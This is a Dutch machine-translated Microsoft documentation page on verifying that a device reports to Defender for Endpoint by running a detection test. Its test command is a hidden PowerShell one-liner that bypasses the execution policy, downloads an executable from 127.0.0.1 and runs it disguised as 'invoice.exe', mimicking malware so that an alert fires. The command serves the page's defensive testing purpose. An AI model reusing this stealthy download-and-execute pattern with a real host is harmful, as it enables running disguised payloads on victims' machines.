---
title: Een detectietest uitvoeren op een nieuw ingebouwde Microsoft Defender voor eindpuntapparaat
description: Voer het detectiescript uit op een nieuw onboarded apparaat om te controleren of het correct is onboarded bij de Microsoft Defender for Endpoint-service.
keywords: detectietest, detectie, powershell, script, verifiëren, onboarding, Microsoft Defender voor endpoint onboarding, clients, servers, test
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 10090fdd1dff6b020d06c82afa8456d7a157ff91
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: nl-NL
ms.lasthandoff: 06/08/2021
ms.locfileid: "52843304"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>Een detectietest uitvoeren op een nieuw ingebouwde Microsoft Defender voor eindpuntapparaat 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**Van toepassing op:**
- Ondersteunde Windows 10 versies
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server, versie 1803
- Windows Server, 2019
- [Microsoft Defender voor Eindpunt](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Wilt u Microsoft Defender voor Eindpunt ervaren? [Meld u aan voor een gratis proefabonnement.](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

Voer het volgende PowerShell-script uit op een nieuw onboarded apparaat om te controleren of het correct rapporteert aan de Defender voor Eindpunt-service.

1. Een map maken: 'C:\test-MDATP-test'.
2. Open een opdrachtregelprompt met verhoogde opdrachtregel op het apparaat en voer het script uit:

   1. Go to **Start** and type **cmd**.

   1. Klik met de rechtermuisknop **op Opdrachtprompt** en selecteer **Uitvoeren als beheerder.**

      ![Venster startmenu dat verwijst naar Uitvoeren als beheerder](images/run-as-admin.png)

3. Kopieer en voer de volgende opdracht uit bij de prompt:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

Het venster Opdrachtprompt wordt automatisch gesloten. Als dit is gelukt, wordt de detectietest gemarkeerd als voltooid en wordt binnen ongeveer 10 minuten een nieuwe waarschuwing weergegeven in de portal voor het onboarded-apparaat.

## <a name="related-topics"></a>Verwante onderwerpen
- [Onboarden Windows 10-apparaten](configure-endpoints.md)
- [Onboard-servers](configure-server-endpoints.md)
- [Problemen met de onboarding van Microsoft Defender voor eindpunten oplossen](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
